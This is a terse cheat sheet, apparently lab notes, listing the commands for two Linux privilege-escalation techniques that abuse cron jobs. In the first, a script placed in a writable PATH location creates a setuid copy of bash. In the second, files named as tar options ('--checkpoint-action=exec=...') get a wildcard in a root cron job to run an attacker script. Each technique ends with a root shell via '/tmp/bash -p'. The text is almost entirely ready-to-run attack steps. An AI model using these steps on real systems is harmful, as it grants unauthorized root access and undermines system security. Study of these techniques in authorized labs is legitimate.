## 1. CRON PATH

### Detect
```
cat /etc/crontab
Notice the value of the “PATH” variable
```
### Execution
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh

Wait 1 minute for the Bash script to execute.

/tmp/bash -p
id
```
## 2. CRON WILDCARDS

### Detect
```
cat /etc/crontab
cat /usr/local/bin/compress.sh
```
### Execution
```
ls -la /usr/local/bin/compress.sh
pwd
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh

Wait 1 minute for the Bash script to execute.

/tmp/bash -p
id


